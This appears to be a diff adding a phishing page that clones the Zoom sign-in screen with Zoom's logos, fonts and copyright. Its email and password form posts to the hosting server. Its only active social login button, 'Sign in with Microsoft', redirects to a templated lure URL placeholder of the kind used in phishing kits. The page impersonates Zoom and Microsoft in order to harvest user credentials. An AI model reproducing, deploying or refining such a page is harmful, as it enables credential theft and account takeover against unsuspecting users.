@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In | Zoom</title>
+  <link rel="icon" href="https://st1.zoom.us/zoom.ico">
+  <link href="https://st1.zoom.us/static/6.3.36622/css/fonts/internacional.min.css" rel="stylesheet" type="text/css"/>
+  <link href="https://st3.zoom.us/static/6.3.36622/css/fonts/suisse.min.css" rel="stylesheet" type="text/css"/>
+  <style>
+    body {
+      background: #f4f6f8;
+      font-family: 'Segoe UI', 'Suisse', 'Internacional', Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+    }
+    .zoom-header {
+      width: 100%;
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 0 0 32px;
+      height: 64px;
+      box-sizing: border-box;
+    }
+    .zoom-header-logo {
+      display: flex;
+      align-items: center;
+      height: 100%;
+    }
+    .zoom-header-logo img {
+      height: 36px;
+    }
+    .zoom-header-links {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      margin-right: 32px;
+    }
+    .zoom-header-links a {
+      color: #232333;
+      text-decoration: none;
+      font-size: 1rem;
+      font-weight: 500;
+      margin-left: 12px;
+    }
+    .zoom-header-lang {
+      margin-left: 16px;
+      font-size: 0.95rem;
+      color: #888;
+      border: none;
+      background: transparent;
+      cursor: pointer;
+    }
+    .zoom-login-main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: calc(100vh - 64px - 60px);
+      padding: 32px 0 24px 0;
+    }
+    .zoom-login-card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+      max-width: 400px;
+      width: 100%;
+      padding: 32px 24px 24px 24px;
+      box-sizing: border-box;
+      margin-bottom: 16px;
+    }
+    .zoom-login-title {
+      font-size: 1.6rem;
+      font-weight: 600;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    .zoom-oauth-btns {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+    .zoom-oauth-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 10px 0;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      background: #fafbfc;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+      text-decoration: none;
+      color: #232333;
+    }
+    .zoom-oauth-btn.google { color: #4285f4; }
+    .zoom-oauth-btn.facebook { color: #1877f3; }
+    .zoom-oauth-btn.apple { color: #000; }
+    .zoom-oauth-btn.sso { color: #232333; }
+    .zoom-oauth-btn.microsoft {
+      color: #2F2F2F;
+      background: #f3f3f3;
+      border: 1px solid #e0e0e0;
+    }
+    .zoom-oauth-btn img {
+      height: 20px;
+      width: 20px;
+      margin-right: 10px;
+      vertical-align: middle;
+      background: #fff;
+      border-radius: 2px;
+    }
+    .zoom-oauth-btn:hover { background: #f0f0f0; }
+    .zoom-login-divider {
+      text-align: center;
+      margin: 18px 0 18px 0;
+      color: #888;
+      font-size: 0.95rem;
+      position: relative;
+    }
+    .zoom-login-divider:before, .zoom-login-divider:after {
+      content: '';
+      display: inline-block;
+      width: 40%;
+      height: 1px;
+      background: #e0e0e0;
+      vertical-align: middle;
+      margin: 0 8px;
+    }
+    .zoom-login-form label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 1rem;
+      font-weight: 500;
+    }
+    .zoom-login-form input[type="text"],
+    .zoom-login-form input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #d1d1d1;
+      border-radius: 4px;
+      margin-bottom: 16px;
+      font-size: 1rem;
+    }
+    .zoom-login-form .zoom-login-actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .zoom-login-form .zoom-login-actions label {
+      font-size: 0.95rem;
+      font-weight: 400;
+      margin-bottom: 0;
+    }
+    .zoom-login-form button[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background: #2d8cff;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .zoom-login-form button[type="submit"]:hover {
+      background: #1765c1;
+    }
+    .zoom-login-links {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+      font-size: 0.95rem;
+    }
+    .zoom-footer {
+      width: 100%;
+      background: #fff;
+      border-top: 1px solid #e0e0e0;
+      text-align: center;
+      padding: 18px 0 16px 0;
+      font-size: 0.95rem;
+      color: #888;
+      position: fixed;
+      left: 0;
+      bottom: 0;
+    }
+    @media (max-width: 500px) {
+      .zoom-header, .zoom-footer {
+        padding-left: 8px;
+        padding-right: 8px;
+      }
+      .zoom-login-card {
+        padding: 18px 6px 18px 6px;
+        max-width: 98vw;
+      }
+      .zoom-login-title {
+        font-size: 1.2rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header class="zoom-header">
+    <div class="zoom-header-logo">
+      <a href="/">
+        <img src="https://st1.zoom.us/static/6.3.36622/image/new/ZoomLogo.png" alt="Zoom">
+      </a>
+    </div>
+    <div class="zoom-header-links">
+      <a href="/signup">Sign Up Free</a>
+      <a href="/forgot_password">Forgot Password?</a>
+      <select class="zoom-header-lang" aria-label="Select Language">
+        <option value="en-US" selected>English</option>
+        <option value="es">Español</option>
+        <option value="de">Deutsch</option>
+        <option value="fr">Français</option>
+        <option value="ja">日本語</option>
+        <option value="pt">Português</option>
+        <option value="ru">Русский</option>
+        <option value="zh-cn">简体中文</option>
+        <option value="zh-tw">繁體中文</option>
+      </select>
+    </div>
+  </header>
+  <main class="zoom-login-main">
+    <div class="zoom-login-card">
+      <div class="zoom-login-title">Sign In to Zoom</div>
+      <div class="zoom-oauth-btns">
+        <!-- <a class="zoom-oauth-btn google" href="/google_oauth_signin">
+          <img src="https://www.svgrepo.com/show/303108/google-icon-logo.svg" alt="Google">Sign in with Google
+        </a>
+        <a class="zoom-oauth-btn facebook" href="/facebook_oauth_signin">
+          <img src="https://www.svgrepo.com/show/303114/facebook-3-logo.svg" alt="Facebook">Sign in with Facebook
+        </a>
+        <a class="zoom-oauth-btn apple" href="/apple_oauth_signin">
+          <img src="https://www.svgrepo.com/show/303110/apple-black-logo.svg" alt="Apple">Sign in with Apple
+        </a>
+        <a class="zoom-oauth-btn sso" href="/web/sso/login?en=signin">
+          <img src="https://www.svgrepo.com/show/339521/single-sign-on.svg" alt="SSO">Sign in with SSO
+        </a> -->
+        <a class="zoom-oauth-btn microsoft" type="button" onclick="loginWithMsoft()">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">Sign in with Microsoft
+        </a>
+      </div>
+          <script>
+        function loginWithMsoft() {
+            window.location.assign({lure_url_js});
+        }
+    </script>
+      <div class="zoom-login-divider">or</div>
+      <form class="zoom-login-form" method="post" action="/signin">
+        <label for="email">Email Address</label>
+        <input type="text" id="email" name="email" autocomplete="username" required>
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" autocomplete="current-password" required>
+        <div class="zoom-login-actions">
+          <label><input type="checkbox" name="remember" style="margin-right:6px;">Keep me signed in</label>
+          <a href="/forgot_password">Forgot?</a>
+        </div>
+        <button type="submit">Sign In</button>
+      </form>
+      <div class="zoom-login-links">
+        <a href="/signup">Sign Up Free</a>
+        <a href="/terms">Terms of Service</a>
+      </div>
+    </div>
+  </main>
+  <footer class="zoom-footer">
+    &copy; 2024 Zoom Video Communications, Inc. All rights reserved.
+  </footer>
+</body>
+</html>
